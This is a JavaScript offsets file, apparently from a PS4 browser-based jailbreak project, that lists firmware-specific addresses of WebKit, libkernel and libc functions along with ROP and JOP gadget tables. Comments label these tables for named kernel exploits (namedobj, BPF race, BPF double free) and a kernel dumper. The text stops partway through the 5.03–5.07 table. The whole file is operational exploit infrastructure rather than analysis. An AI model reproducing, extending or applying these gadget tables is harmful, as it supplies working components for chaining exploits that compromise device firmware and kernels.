// offsets.js
// TODO:
//    - Find missing offsets/patches
//    - Recheck every single thing
//    - Label range comments correctly
//    - Trim all unused variables/gadgets (If more than one exploit works for a FW leave in all offsets needed)
//      - Should also include any gadgets for dumping kernel via webkit
//    - May want to swap firmware version/devkit check order in case things don't line up with shared offsets like they do on retail
//    - Add 5.05+ for everything

var leakval_slide = 0x10;
if (fwFromUA <= 4.07) {
  leakval_slide = 0x28;
}

// Missing: <3.00
// This is the offset of the parseFloat function within libSceWebKit2.sprx, start dumping and guessing what it is
var parseFloat_offset = 0x0;
if (fwFromUA >= 3.00 && fwFromUA <= 3.11) {
  parseFloat_offset =                   0x00044370;
} else if (fwFromUA === 3.15) {
  parseFloat_offset =                   0x00037220;
} else if (fwFromUA >= 3.50 && fwFromUA <= 3.70) {
  parseFloat_offset =                   0x00055EA0;
} else if (fwFromUA >= 4.00 && fwFromUA <= 4.07) {
  parseFloat_offset =                   0x00055FB0;
} else if (fwFromUA >= 4.50 && fwFromUA <= 4.74) {
  parseFloat_offset =                   0x00E8DDA0;
} else if (fwFromUA >= 5.00 && fwFromUA <= 5.01) {
  parseFloat_offset =                   0x005783D0;
} else if (fwFromUA >= 5.03 && fwFromUA <= 5.07) {
  parseFloat_offset =                   0x00578540;
} else if (fwFromUA === 5.50) {
  parseFloat_offset =                   0x0059B3D0;
} else if (fwFromUA >= 5.53 && fwFromUA <= 5.56) {
  parseFloat_offset =                   0x0059B3E0;
}

// Missing: <3.00
// These are from libSceWebKit2.sprx, libkernel_web.sprx (libkernel.sprx on FWs <4.00), and libSceLibcInternal.sprx
var gadget_offsets = {};
if (fwFromUA >= 3.00 && fwFromUA <= 3.11) {
  gadget_offsets = {
    '__stack_chk_fail':                 0x00000108, // 3.00-3.15 // libSceWebKit2
    '__stack_chk_fail_offset':          0x0000D390, // 3.00-3.15 // libkernel
    'memcpy':                           0x00000158, // 3.00-3.11 // libSceWebKit2
    'memset':                           0x00000168, // 3.00-3.11 // libSceWebKit2
    'memset_offset':                    0x000694D0, // 3.00-3.15 // libSceLibcInternal
    'setjmp':                           0x000002C8, // 3.00-3.11 // libSceWebKit2
    'scePthreadCreate':                 0x00012500, // 3.00-3.15 // libkernel
    'mov rdi, [rdi+0x48]':              0x00064E12, // 3.00-3.15 // libSceLibcInternal
    'sub rax, rcx':                     0x00017B9B, // 3.00-3.15 // libkernel
    'add rax, [rdi]':                   0x0003B698, // 3.00-3.15 // libSceLibcInternal
  };
} else if (fwFromUA === 3.15) {
  gadget_offsets = {
    '__stack_chk_fail':                 0x00000108, // 3.00-3.15
    '__stack_chk_fail_offset':          0x0000D390, // 3.00-3.15
    'memcpy':                           0x00000148, // 3.15
    'memset':                           0x00000158, // 3.15
    'memset_offset':                    0x000694D0, // 3.00-3.15
    'setjmp':                           0x000002A8, // 3.15
    'scePthreadCreate':                 0x00012500, // 3.00-3.15
    'mov rdi, [rdi+0x48]':              0x00064E12, // 3.00-3.15
    'sub rax, rcx':                     0x00017B9B, // 3.00-3.15
    'add rax, [rdi]':                   0x0003B698, // 3.00-3.15
  };
} else if (fwFromUA >= 3.50 && fwFromUA <= 3.70) {
  gadget_offsets = {
    '__stack_chk_fail':                 0x000000E8, // 3.50-3.70
    '__stack_chk_fail_offset':          0x0000D790, // 3.50-3.70
    'memcpy':                           0x00000128, // 3.50-3.70
    'memset':                           0x00000138, // 3.50-3.70
    'memset_offset':                    0x00092D10, // 3.50-3.70
    'setjmp':                           0x000002B8, // 3.50-3.70
    'scePthreadCreate':                 0x00011E80, // 3.50-3.70
    'mov rdi, [rdi+0x48]':              0x0008E982, // 3.50-3.70
    'sub rax, rcx':                     0x0001773B, // 3.50-3.70
    'add rax, [rdi]':                   0x00040B58, // 3.50-3.70
  };
} else if (fwFromUA >= 4.00 && fwFromUA <= 4.07) {
  gadget_offsets = {
    '__stack_chk_fail':                 0x000000F0, // 4.00-4.07
    '__stack_chk_fail_offset':          0x0000D0D0, // 4.00-4.07
    'memcpy':                           0x00000130, // 4.00-4.07
    'memset':                           0x00000140, // 4.00-4.07
    'memset_offset':                    0x00037080, // 4.00-4.07
    'setjmp':                           0x00000270, // 4.00-4.07
    'scePthreadCreate':                 0x00011570, // 4.00-4.07
    'mov rdi, [rdi+0x48]':              0x000A8282, // 4.00-4.07
    'sub rax, rcx':                     0x0001702B, // 4.00-4.07
    'add rax, [rdi]':                   0x00058978, // 4.00-4.07
  };
} else if (fwFromUA >= 4.50 && fwFromUA <= 4.55) {
  gadget_offsets = {
    '__stack_chk_fail':                 0x000000C8, // 4.50-5.55
    '__stack_chk_fail_offset':          0x0000D190, // 4.50-4.74
    'memcpy':                           0x000000F8, // 4.50-4.74
    'memset':                           0x00000248, // 4.50-4.74
    'memset_offset':                    0x0002AE10, // 4.50-4.74
    'setjmp':                           0x00001468, // 4.50-4.74
    'scePthreadCreate':                 0x000115C0, // 4.50-4.74
    'mov rdi, [rdi+0x48]':              0x000A1262, // 4.50-4.74
    'sub rax, rcx':                     0x0001760B, // 4.50-4.55
    'add rax, [rdi]':                   0x0004C418, // 4.50-4.74
  };
} else if (fwFromUA >= 4.70 && fwFromUA <= 4.74) {
  gadget_offsets = {
    '__stack_chk_fail':                 0x000000C8, // 4.50-5.55
    '__stack_chk_fail_offset':          0x0000D190, // 4.50-4.74
    'memcpy':                           0x000000F8, // 4.50-4.74
    'memset':                           0x00000248, // 4.50-4.74
    'memset_offset':                    0x0002AE10, // 4.50-4.74
    'setjmp':                           0x00001468, // 4.50-4.74
    'scePthreadCreate':                 0x000115C0, // 4.50-4.74
    'mov rdi, [rdi+0x48]':              0x000A1262, // 4.50-4.74
    'sub rax, rcx':                     0x0001789B, // 4.70-4.74
    'add rax, [rdi]':                   0x0004C418, // 4.50-4.74
  };
} else if (fwFromUA >= 5.00 && fwFromUA <= 5.07) {
  gadget_offsets = {
    '__stack_chk_fail':                 0x000000C8, // 4.50-5.55
    '__stack_chk_fail_offset':          0x00011EC0, // 5.00-5.07
    'memcpy':                           0x000000F8, // 5.00-5.55
    'memset':                           0x00000228, // 5.00-5.55
    'memset_offset':                    0x000225E0, // 5.00-5.07
    'setjmp':                           0x000014F8, // 5.00-5.55
    'scePthreadCreate':                 0x000098C0, // 5.00-5.07
    'mov rdi, [rdi+0x48]':              0x000B00F2, // 5.00-5.07
    'sub rax, rcx':                     0x0001EADB, // 5.00-5.07
    'add rax, [rdi]':                   0x00044DB8, // 5.00-5.07
  };
} else if (fwFromUA >= 5.50 && fwFromUA <= 5.53) {
  gadget_offsets = {
    '__stack_chk_fail':                 0x000000C8, // 5.50-5.56
    '__stack_chk_fail_offset':          0x00012F70, // 5.50-5.56
    'memcpy':                           0x000000F8, // 5.50-5.56
    'memset':                           0x00000228, // 5.50-5.56
    'memset_offset':                    0x00022F40, // 5.50-5.53
    'setjmp':                           0x000014F8, // 5.50-5.56
    'scePthreadCreate':                 0x0000A2D0, // 5.50-5.56
    // 'mov rdi, [rdi+0x48]':              0x0, // 48 8B 7F 48 C3
    'sub rax, rcx':                     0x0001FFEB, // 5.50-5.56
    'add rax, [rdi]':                   0x00046298, // 5.50-5.53
  };
} else if (fwFromUA >= 5.55 && fwFromUA <= 5.56) {
  gadget_offsets = {
    '__stack_chk_fail':                 0x000000C8, // 5.50-5.56
    '__stack_chk_fail_offset':          0x00012F70, // 5.50-5.56
    'memcpy':                           0x000000F8, // 5.50-5.56
    'memset':                           0x00000228, // 5.50-5.56
    'memset_offset':                    0x00022F50, // 5.55-5.56
    'setjmp':                           0x000014F8, // 5.50-5.56
    'scePthreadCreate':                 0x0000A2D0, // 5.50-5.56
    // 'mov rdi, [rdi+0x48]':              0x0, // 48 8B 7F 48 C3
    'sub rax, rcx':                     0x0001FFEB, // 5.50-5.56
    'add rax, [rdi]':                   0x000462D8, // 5.55-5.56
  };
}

// Missing: <3.00 and >=6.50
// These are from libSceWebKit2.sprx
var gadget_cache = {};
if (fwFromUA >= 3.00 && fwFromUA <= 3.11) {
  gadget_cache = {
    // Regular ROP Gadgets
    'ret':                              0x00000062, // 3.00-3.70
    'jmp rax':                          0x00000092, // 3.00-3.70
    'ep':                               0x000000BD, // 3.00-3.70
    'pop rbp':                          0x000000C6, // 3.00-3.70
    'mov [rdi], rax':                   0x000D9184, // 3.00-3.11
    'pop r8':                           0x0033E1DD, // 3.00-3.11
    'pop rax':                          0x0000FA1B, // 3.00-3.11
    'mov rax, rdi':                     0x00003253, // 3.00-3.11
    'mov rax, [rax]':                   0x0003A1B2, // 3.00-3.11
    'pop rsi':                          0x001CCF35, // 3.00-3.11
    'pop rdi':                          0x00103F0D, // 3.00-3.11
    'pop rcx':                          0x002B4123, // 3.00-3.11
    'pop rsp':                          0x00041F30, // 3.00-3.11
    'mov [rdi], rsi':                   0x002EEF90, // 3.00-3.11
    'pop rdx':                          0x003A0788, // 3.00-3.11
    'pop r9':                           0x00ADBEFF, // 3.00-3.11
    'jop':                              0x011399F4, // 3.00-3.11
    'infloop':                          0x0004668F, // 3.00-3.11

    // kROP gadgets
    'mov [rdx], rax':                   0x0040D8CD, // 3.00-3.11
    'add rax, rcx':                     0x0005AF06, // 3.00-3.11
    'mov rdx, rax':                     0x000E5B13, // 3.00-3.11
    'mov rax, rdx':                     0x001D3EE1, // 3.00-3.11
    'jmp rdx':                          0x0003588C, // 3.00-3.11

    // namedobj kexploit
    'push rax; jmp rcx':                0x0030F0B0, // 3.00-3.11

    // BPF race kexploit
    'leave':                            0x000E5B2B, // 3.00-3.11

    // BPF race old kexploit
    'leave_1':                          0x0, /* CHECKTHIS */

    // BPF double free kexploit
    'ret2userland':                     0x00009E9A, // 3.00-3.11
    'add rsp, 0x28':                    0x00004228, // 3.00-3.11
    'mov rax, [rdi]':                   0x0006D5E0, // 3.00-3.11
    'mov [rsi], rdx':                   0x00E04C68, // 3.00-3.11
    'add rdi, rax; mov rax, rdi':       0x00E48C57, // 3.00-3.11

    // BPF double free JOP kdumper
    'mov rsi, rax; jmp rcx':            0x00101290, // 3.00-3.11

    // JOP gadgets for BPF double free kexploit
    'jop1':                             0x0043E21D, // 3.00-3.11
    'jop2':                             0x0113EFB1, // 3.00-3.11
    'jop3':                             0x00CBD8EB, // 3.00-3.11
    'jop4':                             0x011399F0, // 3.00-3.11
    'jop_mov rbp, rsp':                 0x009ABC21, // 3.00-3.11
    'jop6':                             0x003FF95D, // 3.00-3.11

    // Functions
    'longjmp':                          0x00000D98, // 3.00-3.11
    'createThread':                     0x001C8B90, // 3.00-3.11
  };
} else if (fwFromUA === 3.15) {
  gadget_cache = {
    // Regular ROP Gadgets
    'ret':                              0x00000062, // 3.00-3.70
    'jmp rax':                          0x00000092, // 3.00-3.70
    'ep':                               0x000000BD, // 3.00-3.70
    'pop rbp':                          0x000000C6, // 3.00-3.70
    'mov [rdi], rax':                   0x000B62D4, // 3.15
    'pop r8':                           0x0030434D, // 3.15
    'pop rax':                          0x0000F43B, // 3.15
    'mov rax, rdi':                     0x00003193, // 3.15
    'mov rax, [rax]':                   0x0002D372, // 3.15
    'pop rsi':                          0x001935D5, // 3.15
    'pop rdi':                          0x001938D8, // 3.15
    'pop rcx':                          0x00247763, // 3.15
    'pop rsp':                          0x00064C05, // 3.15
    'mov [rdi], rsi':                   0x002B5100, // 3.15
    'pop rdx':                          0x00065A22, // 3.15
    'pop r9':                           0x00A4454F, // 3.15
    'jop':                              0x0106AA64, // 3.15
    'infloop':                          0x000115D6, // 3.15

    // kROP gadgets
    'mov [rdx], rax':                   0x003D3A3D, // 3.15
    'add rax, rcx':                     0x0004C826, // 3.15
    'mov rdx, rax':                     0x00E24F52, // 3.15
    'mov rax, rdx':                     0x0019A1E1, // 3.15
    'jmp rdx':                          0x00018E47, // 3.15

    // namedobj kexploit
    'push rax; jmp rcx':                0x002D5220, // 3.15

    // BPF race kexploit
    'leave':                            0x00023D3B, // 3.15

    // BPF race old kexploit
    'leave_1':                          0x0, /* CHECKTHIS */

    // BPF double free kexploit
    'ret2userland':                     0x00009D9A, // 3.15
    'add rsp, 0x28':                    0x00004128, // 3.15
    'mov rax, [rdi]':                   0x0005D910, // 3.15
    'mov [rsi], rdx':                   0x00D6C858, // 3.15
    'add rdi, rax; mov rax, rdi':       0x00DB0847, // 3.15

    // BPF double free JOP kdumper
    'mov rsi, rax; jmp rcx':            0x000C85C0, // 3.15

    // JOP gadgets for BPF double free kexploit
    'jop1':                             0x0040438D, // 3.15
    'jop2':                             0x01070021, // 3.15
    'jop3':                             0x00C254DB, // 3.15
    'jop4':                             0x0106AA60, // 3.15
    'jop_mov rbp, rsp':                 0x00914271, // 3.15
    'jop6':                             0x003C5ACD, // 3.15

    // Functions
    'longjmp':                          0x00000CE8, // 3.15
    'createThread':                     0x0018F260, // 3.15
  };
} else if (fwFromUA === 3.50) {
  gadget_cache = {
    // Regular ROP Gadgets
    'ret':                              0x00000062, // 3.00-3.70
    'jmp rax':                          0x00000092, // 3.00-3.70
    'ep':                               0x000000BD, // 3.00-3.70
    'pop rbp':                          0x000000C6, // 3.00-3.70
    'mov [rdi], rax':                   0x0011FC37, // 3.50-3.70
    'pop r8':                           0x004C12ED, // 3.50
    'pop rax':                          0x0001C6AB, // 3.50-3.70
    'mov rax, rdi':                     0x000057C3, // 3.50-3.70
    'mov rax, [rax]':                   0x0004ADD2, // 3.50-3.70
    'pop rsi':                          0x000B9EBB, // 3.50-3.70
    'pop rdi':                          0x00113991, // 3.50-3.70
    'pop rcx':                          0x003CA71B, // 3.50-3.70
    'pop rsp':                          0x00376850, // 3.50-3.70
    'mov [rdi], rsi':                   0x00458400, // 3.50
    'pop rdx':                          0x00001AFA, // 3.50-3.70
    'pop r9':                           0x00EE09BF, // 3.50
    'jop':                              0x0086D424, // 3.50
    'infloop':                          0x00057F2F, // 3.50-3.70

    // kROP gadgets
    'mov [rdx], rax':                   0x005DC36D, // 3.50
    'add rax, rcx':                     0x000879D7, // 3.50-3.70
    'mov rdx, rax':                     0x0000B45C, // 3.50-3.70
    'mov rax, rdx':                     0x002E19F1, // 3.50-3.70
    'jmp rdx':                          0x0002A4B2, // 3.50-3.70

    // namedobj kexploit
    'push rax; jmp rcx':                0x004853E0, // 3.50

    // BPF race kexploit
    'leave':                            0x0000AE00, // 3.50-3.70

    // BPF race old kexploit
    'leave_1':                          0x00003E8A, // 3.50-3.70

    // BPF double free kexploit
    'ret2userland':                     0x0000FC7A, // 3.50-3.70
    'add rsp, 0x28':                    0x00006AF2, // 3.50-3.70
    'mov rax, [rdi]':                   0x000A0450, // 3.50-3.70
    'mov [rsi], rdx':                   0x011EC363, // 3.50
    'add rdi, rax; mov rax, rdi':       0x012B4808, // 3.50

    // BPF double free JOP kdumper
    'mov rsi, rax; jmp rcx':            0x001AC260, // 3.50-3.70

    // JOP gadgets for BPF double free kexploit
    'jop1':                             0x0061A79D, // 3.50
    'jop2':                             0x00886391, // 3.50
    'jop3':                             0x01120ADB, // 3.50
    'jop4':                             0x0086D420, // 3.50
    'jop_mov rbp, rsp':                 0x00D471F1, // 3.50
    'jop6':                             0x005CB8BD, // 3.50

    // Functions
    'longjmp':                          0x00000D98, // 3.50-3.70
    'createThread':                     0x002D1CB0, // 3.50-3.70
  };
} else if (fwFromUA >= 3.55 && fwFromUA <= 3.70) {
  gadget_cache = {
    // Regular ROP Gadgets
    'ret':                              0x00000062, // 3.00-3.70
    'jmp rax':                          0x00000092, // 3.00-3.70
    'ep':                               0x000000BD, // 3.00-3.70
    'pop rbp':                          0x000000C6, // 3.00-3.70
    'mov [rdi], rax':                   0x0011FC37, // 3.50-3.70
    'pop r8':                           0x004C13BD, // 3.55-3.70
    'pop rax':                          0x0001C6AB, // 3.50-3.70
    'mov rax, rdi':                     0x000057C3, // 3.50-3.70
    'mov rax, [rax]':                   0x0004ADD2, // 3.50-3.70
    'pop rsi':                          0x000B9EBB, // 3.50-3.70
    'pop rdi':                          0x00113991, // 3.50-3.70
    'pop rcx':                          0x003CA71B, // 3.50-3.70
    'pop rsp':                          0x00376850, // 3.50-3.70
    'mov [rdi], rsi':                   0x004584D0, // 3.55-3.70
    'pop rdx':                          0x00001AFA, // 3.50-3.70
    'pop r9':                           0x00EE0A8F, // 3.55-3.70
    'jop':                              0x0086D4F4, // 3.55-3.70
    'infloop':                          0x00057F2F, // 3.50-3.70

    // kROP gadgets
    'mov [rdx], rax':                   0x005DC43D, // 3.55-3.70
    'add rax, rcx':                     0x000879D7, // 3.50-3.70
    'mov rdx, rax':                     0x0000B45C, // 3.50-3.70
    'mov rax, rdx':                     0x002E19F1, // 3.50-3.70
    'jmp rdx':                          0x0002A4B2, // 3.50-3.70

    // namedobj kexploit
    'push rax; jmp rcx':                0x004854B0, // 3.55-3.70

    // BPF race kexploit
    'leave':                            0x0000AE00, // 3.50-3.70

    // BPF race old kexploit
    'leave_1':                          0x00003E8A, // 3.50-3.70

    // BPF double free kexploit
    'ret2userland':                     0x0000FC7A, // 3.50-3.70
    'add rsp, 0x28':                    0x00006AF2, // 3.50-3.70
    'mov rax, [rdi]':                   0x000A0450, // 3.50-3.70
    'mov [rsi], rdx':                   0x011EC433, // 3.55-3.70
    'add rdi, rax; mov rax, rdi':       0x012B48D8, // 3.55-3.70

    // BPF double free JOP kdumper
    'mov rsi, rax; jmp rcx':            0x001AC260, // 3.50-3.70

    // JOP gadgets for BPF double free kexploit
    'jop1':                             0x0061A86D, // 3.55-3.70
    'jop2':                             0x00886461, // 3.55-3.70
    'jop3':                             0x01120BAB, // 3.55-3.70
    'jop4':                             0x0086D4F0, // 3.55-3.70
    'jop_mov rbp, rsp':                 0x00D472C1, // 3.55-3.70
    'jop6':                             0x005CB98D, // 3.55-3.70

    // Functions
    'longjmp':                          0x00000D98, // 3.50-3.70
    'createThread':                     0x002D1CB0, // 3.50-3.70
  };
} else if (fwFromUA >= 4.00 && fwFromUA <= 4.05) {
  gadget_cache = {
    // Regular ROP Gadgets
    'ret':                              0x000000C8, // 4.00-4.07
    'jmp rax':                          0x00000093, // 4.00-4.07
    'ep':                               0x000000BE, // 4.00-4.07
    'pop rbp':                          0x000000C7, // 4.00-4.07
    'mov [rdi], rax':                   0x0011ADD7, // 4.00-4.07
    'pop r8':                           0x004A3B0D, // 4.00-4.07
    'pop rax':                          0x0001D70B, // 4.00-4.07
    'mov rax, rdi':                     0x00005863, // 4.00-4.07
    'mov rax, [rax]':                   0x000FD88D, // 4.00-4.07
    'pop rsi':                          0x000A459E, // 4.00-4.07
    'pop rdi':                          0x0010F1C1, // 4.00-4.07
    'pop rcx':                          0x004C92F5, // 4.00-4.07
    'pop rsp':                          0x0020AEB0, // 4.00-4.07
    'mov [rdi], rsi':                   0x0043CF70, // 4.00-4.07
    'pop rdx':                          0x000D6660, // 4.00-4.07
    'pop r9':                           0x00EB5F8F, // 4.00-4.07
    'jop':                              0x00852624, // 4.00-4.07
    'infloop':                          0x00045A11, // 4.00-4.07

    // kROP gadgets
    'mov [rdx], rax':                   0x005BB74D, // 4.00-4.07
    'add rax, rcx':                     0x00086F06, // 4.00-4.07
    'mov rdx, rax':                     0x0000B44A, // 4.00-4.07
    'mov rax, rdx':                     0x000DAB96, // 4.00-4.07
    'jmp rdx':                          0x0027A198, // 4.00-4.07

    // namedobj kexploit
    'push rax; jmp rcx':                0x00469B80, // 4.00-4.07

    // BPF race kexploit
    'leave':                            0x001B7D63, // 4.00-4.07

    // BPF race old kexploit
    'leave_1':                          0x00003F1A, // 4.00-4.07

    // BPF double free kexploit
    'ret2userland':                     0x0000FC0A, // 4.00-4.07
    'add rsp, 0x28':                    0x00006B72, // 4.00-4.07
    'mov rax, [rdi]':                   0x0009E490, // 4.00-4.07
    'mov [rsi], rdx':                   0x011C1703, // 4.00-4.05
    'add rdi, rax; mov rax, rdi':       0x01289BA8, // 4.00-4.05

    // BPF double free JOP kdumper
    'mov rsi, rax; jmp rcx':            0x001A7B90, // 4.00-4.07

    // JOP gadgets for BPF double free kexploit
    'jop1':                             0x005FA63D, // 4.00-4.07
    'jop2':                             0x0086BAC1, // 4.00-4.07
    'jop3':                             0x010F5E7B, // 4.00-4.07
    'jop4':                             0x00852620, // 4.00-4.07
    'jop_mov rbp, rsp':                 0x002F88E4, // 4.00-4.07
    'jop6':                             0x005AAD1D, // 4.00-4.07

    // Functions
    'longjmp':                          0x00000DE0, // 4.00-4.07
    'createThread':                     0x002C48C0, // 4.00-4.07
  };
} else if (fwFromUA >= 4.06 && fwFromUA <= 4.07) {
  gadget_cache = {
    // Regular ROP Gadgets
    'ret':                              0x000000C8, // 4.00-4.07
    'jmp rax':                          0x00000093, // 4.00-4.07
    'ep':                               0x000000BE, // 4.00-4.07
    'pop rbp':                          0x000000C7, // 4.00-4.07
    'mov [rdi], rax':                   0x0011ADD7, // 4.00-4.07
    'pop r8':                           0x004A3B0D, // 4.00-4.07
    'pop rax':                          0x0001D70B, // 4.00-4.07
    'mov rax, rdi':                     0x00005863, // 4.00-4.07
    'mov rax, [rax]':                   0x000FD88D, // 4.00-4.07
    'pop rsi':                          0x000A459E, // 4.00-4.07
    'pop rdi':                          0x0010F1C1, // 4.00-4.07
    'pop rcx':                          0x004C92F5, // 4.00-4.07
    'pop rsp':                          0x0020AEB0, // 4.00-4.07
    'mov [rdi], rsi':                   0x0043CF70, // 4.00-4.07
    'pop rdx':                          0x000D6660, // 4.00-4.07
    'pop r9':                           0x00EB5F8F, // 4.00-4.07
    'jop':                              0x00852624, // 4.00-4.07
    'infloop':                          0x00045A11, // 4.00-4.07

    // kROP gadgets
    'mov [rdx], rax':                   0x005BB74D, // 4.00-4.07
    'add rax, rcx':                     0x00086F06, // 4.00-4.07
    'mov rdx, rax':                     0x0000B44A, // 4.00-4.07
    'mov rax, rdx':                     0x000DAB96, // 4.00-4.07
    'jmp rdx':                          0x0027A198, // 4.00-4.07

    // namedobj kexploit
    'push rax; jmp rcx':                0x00469B80, // 4.00-4.07

    // BPF race kexploit
    'leave':                            0x001B7D63, // 4.00-4.07

    // BPF race old kexploit
    'leave_1':                          0x00003F1A, // 4.00-4.07

    // BPF double free kexploit
    'ret2userland':                     0x0000FC0A, // 4.00-4.07
    'add rsp, 0x28':                    0x00006B72, // 4.00-4.07
    'mov rax, [rdi]':                   0x0009E490, // 4.00-4.07
    'mov [rsi], rdx':                   0x011C3983, // 4.06-4.07
    'add rdi, rax; mov rax, rdi':       0x012A14E8, // 4.06-4.07

    // BPF double free JOP kdumper
    'mov rsi, rax; jmp rcx':            0x001A7B90, // 4.00-4.07

    // JOP gadgets for BPF double free kexploit
    'jop1':                             0x005FA63D, // 4.00-4.07
    'jop2':                             0x0086BAC1, // 4.00-4.07
    'jop3':                             0x010F5E7B, // 4.00-4.07
    'jop4':                             0x00852620, // 4.00-4.07
    'jop_mov rbp, rsp':                 0x002F88E4, // 4.00-4.07
    'jop6':                             0x005AAD1D, // 4.00-4.07

    // Functions
    'longjmp':                          0x00000DE0, // 4.00-4.07
    'createThread':                     0x002C48C0, // 4.00-4.07
  };
} else if (fwFromUA >= 4.50 && fwFromUA <= 4.74) {
  gadget_cache = {
    // Regular ROP Gadgets
    'ret':                              0x0000003C, // 4.50-6.20
    'jmp rax':                          0x00000082, // 4.50-5.56
    'ep':                               0x000000AD, // 4.50-5.56
    'pop rbp':                          0x000000B6, // 4.50-6.20
    'mov [rdi], rax':                   0x00003FBA, // 4.50-4.74
    'pop r8':                           0x0000CC42, // 4.50-4.74
    'pop rax':                          0x0000CC43, // 4.50-4.74
    'mov rax, rdi':                     0x0000E84E, // 4.50-4.74
    'mov rax, [rax]':                   0x000130A3, // 4.50-4.74
    'pop rsi':                          0x0007B1EE, // 4.50-4.74
    'pop rdi':                          0x0007B23D, // 4.50-4.74
    'pop rcx':                          0x00271DE3, // 4.50-4.74
    'pop rsp':                          0x0027A450, // 4.50-4.74
    'mov [rdi], rsi':                   0x0039CF70, // 4.50-4.74
    'pop rdx':                          0x00565838, // 4.50-4.74
    'pop r9':                           0x0078BA1F, // 4.50-4.74
    'jop':                              0x01277350, // 4.50-4.74
    'infloop':                          0x012C4009, // 4.50-4.74

    // kROP gadgets
    'mov [rdx], rax':                   0x009B5BE3, // 4.50-4.74
    'add rax, rcx':                     0x0084D04D, // 4.50-4.74
    'mov rdx, rax':                     0x00012A16, // 4.50-4.74
    'mov rax, rdx':                     0x001E4EDE, // 4.50-4.74
    'jmp rdx':                          0x001517C7, // 4.50-4.74

    // BPF race kexploit
    'leave':                            0x0003EBD0, // 4.50-4.74

    // BPF double free kexploit
    'ret2userland':                     0x0008905C, // 4.50-4.74
    'add rsp, 0x28':                    0x000028A2, // 4.50-4.74
    'mov rax, [rdi]':                   0x0013A220, // 4.50-4.74
    'mov [rsi], rdx':                   0x01574006, // 4.50-4.74
    'add rdi, rax; mov rax, rdi':       0x0141D1CD, // 4.50-4.74

    // BPF double free JOP kdumper
    'mov rsi, rax; jmp rcx':            0x00018C10, // 4.50-4.74

    // JOP gadgets for BPF double free kexploit
    'jop1':                             0x005D365D, // 4.50-4.74
    'jop2':                             0x007B0E65, // 4.50-4.74
    'jop3':                             0x0142BDBB, // 4.50-4.74
    'jop4':                             0x00637AC4, // 4.50-4.74
    'jop_mov rbp, rsp':                 0x001B5B7A, // 4.50-4.74
    'jop6':                             0x000F391D, // 4.50-4.74

    // Functions
    'longjmp':                          0x00001458, // 4.50-4.74
    'createThread':                     0x0116ED40, // 4.50-4.74
  };
} else if (fwFromUA >= 5.00 && fwFromUA <= 5.01) {
  gadget_cache = {
    // Regular ROP Gadgets
    'ret':                              0x0000003C, // 4.50-6.20
    'jmp rax':                          0x00000082, // 4.50-5.56
    'ep':                               0x000000AD, // 4.50-5.56
    'pop rbp':                          0x000000B6, // 4.50-6.20
    'mov [rdi], rax':                   0x0014536B, // 5.00-5.01
    'pop r8':                           0x000179C5, // 5.00-5.07
    'pop rax':                          0x000043F5, // 5.00-5.07
    'mov rax, rdi':                     0x000058D0, // 5.00-5.07
    'mov rax, [rax]':                   0x0006C83A, // 5.00-5.07
    'pop rsi':                          0x0008F38A, // 5.00-5.07
    'pop rdi':                          0x00038DBA, // 5.00-5.07
    'pop rcx':                          0x00052E59, // 5.00-5.07
    'pop rsp':                          0x0001E687, // 5.00-5.07
    'mov [rdi], rsi':                   0x00023AC2, // 5.00-5.07
    'pop rdx':                          0x000DEDC2, // 5.00-5.01
    'pop r9':                           0x00BB30CF, // 5.00-5.01
    'jop':                              0x000C37D0, // 5.00-5.07
    'infloop':                          0x0000D53B, // 5.00-5.07

    // kROP gadgets
    'mov [rdx], rax':                   0x001F13DB, // 5.00-5.01
    'add rax, rcx':                     0x000156DB, // 5.00-5.07
    'mov rdx, rax':                     0x00353A71, // 5.00-5.01
    'mov rax, rdx':                     0x001CEE60, // 5.00-5.01
    'jmp rdx':                          0x0000E3D0, // 5.00-5.07

    // BPF double free kexploit
    'ret2userland':                     0x0005CDB9, // 5.00-5.07
    'add rsp, 0x28':                    0x00004C2E, // 5.00-5.07
    'mov rax, [rdi]':                   0x00046EF9, // 5.00-5.07
    'mov [rsi], rdx':                   0x00A643CA, // 5.00-5.01
    'add rdi, rax; mov rax, rdi':       0x0055566F, // 5.00-5.01

    // BPF double free JOP kdumper
    'mov rsi, rax; jmp rcx':            0x0000DEE0, // 5.00-5.07

    // JOP gadgets for BPF double free kexploit
    'jop1':                             0x012A184D, // 5.00-5.01
    'jop2':                             0x006EF2E5, // 5.00-5.01
    'jop3':                             0x015CA29B, // 5.00-5.01
    'jop4':                             0x012846B4, // 5.00-5.01
    'jop_mov rbp, rsp':                 0x000F094A, // 5.00-5.07
    'jop6':                             0x002728A1, // 5.00-5.01

    'longjmp':                          0x000014E8, // 5.00-5.07
    'createThread':                     0x00779190, // 5.00-5.01
  };
} else if (fwFromUA >= 5.03 && fwFromUA <= 5.07) {
  gadget_cache = {
    // Regular ROP Gadgets
    'ret':                              0x0000003C, // 4.50-6.20
    'jmp rax':                          0x00000082, // 4.50-5.56
    'ep':                               0x000000AD, // 4.50-5.56
    'pop rbp':                          0x000000B6, // 4.50-6.20
    'mov [rdi], rax':                   0x0014536B, // 5.03-5.07
    'pop r8':                           0x000179C5, // 5.00-5.07
    'pop rax':                          0x000043F5, // 5.00-5.07
    'mov rax, rdi':                     0x000058D0, // 5.00-5.07
    'mov rax, [rax]':                   0x0006C83A, // 5.00-5.07
    'pop rsi':                          0x0008F38A, // 5.00-5.07
    'pop rdi':                          0x00038DBA, // 5.00-5.07
    'pop rcx':                          0x00052E59, // 5.00-5.07
    'pop rsp':                          0x0001E687, // 5.00-5.07
    'mov [rdi], rsi':                   0x00023AC2, // 5.00-5.07
    'pop rdx':                          0x001BE024, // 5.03-5.07
    'pop r9':                           0x00BB320F, // 5.03-5.07
    'jop':                              0x000C37D0, // 5.00-5.07
    'infloop':                          0x0000D53B, // 5.00-5.07

    // kROP gadgets
    'mov [rdx], rax':                   0x001F149B, // 5.03-5.07
    'add rax, rcx':                     0x000156DB, // 5.00-5.07
    'mov rdx, rax':                     0x00353B31, // 5.03-5.07
    'mov rax, rdx':                     0x001CEF20, // 5.03-5.07
    'jmp rdx':                          0x0000E3D0, // 5.00-5.07

    // BPF double free kexploit
    'ret2userland':                     0x0005CDB9, // 5.00-5.07
    'add rsp, 0x28':                    0x00004C2E, // 5.00-5.07
    'mov rax, [rdi]':                   0x00046EF9, // 5.00-5.07
    'mov [rsi], rdx':                   0x00A6450A, // 5.03-5.07
    'add rdi, rax; mov rax, rdi':       0x005557DF, // 5.03-5.07

    // BPF double free JOP kdumper
    'mov rsi, rax; jmp rcx':            0x0000DEE0, // 5.00-5.07

    // JOP gadgets for BPF double free kexploit
    'jop1':                             0x012A19CD, // 5.03-5.07
